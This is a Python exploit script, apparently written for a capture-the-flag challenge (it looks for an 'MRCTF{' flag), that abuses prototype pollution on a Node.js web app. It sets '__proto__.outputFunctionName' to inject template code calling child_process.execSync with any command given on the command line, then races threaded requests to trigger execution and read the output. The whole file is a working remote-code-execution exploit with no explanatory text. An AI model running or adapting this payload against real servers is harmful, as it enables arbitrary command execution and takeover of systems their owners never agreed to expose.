import requests
import threading
from pwn import *
import time
import random


ip=sys.argv[1]
port=sys.argv[2]
command=sys.argv[3]
flag1=True
tempTime = 20

url="http://"+ip+":"+str(port)+"/"

def attack(command):
    global flag1
    t1 = threading.Thread(target=tar1,args=(command,))
    t2 = threading.Thread(target=tar2)
    t2.start()

    # time.sleep(random.random())
    t1.start()
    # time.sleep(2)
    

def tar1(command):
    global flag1
    ran1=-1
    time1=-1
    while flag1:
        print("tar1")
        ran1 = random.random()
        time.sleep(ran1)
        requests.get(
            url+"hide",
            params={
                "path":"a.__proto__.outputFunctionName",
                "value":'''a=1;
        return process.mainModule.require('child_process').execSync('{}').toString();
        var b'''.format(command)
            })
        time1 = time.time()
        # flag1=False
    print("ran1="+str(time1))

s=b'''GET / HTTP/1.1
Host: 127.0.0.1:4000
Connection: close
Pragma: no-cache
Cache-Control: no-cache

'''
def tar2():
    global flag1
    global tempTime
    try:
        while tempTime>0:
            ran2 = random.random()
            time.sleep(ran2)
            io = remote(ip,port)
            io.send(s)
            time2 = time.time()
            re=io.recv()
            # print(re)
            if(b'MRCTF{' in re):
                print(re)
                flag1 =False
                print("ran2="+str(time2))
                return
            io.close()
            tempTime=tempTime-1
        print("fialed!")
        flag1 =False
    except:
        flag1=False



if __name__ == '__main__':
    attack(command)
# python3 ./exp.py 127.0.0.1 4000 'cat /flag'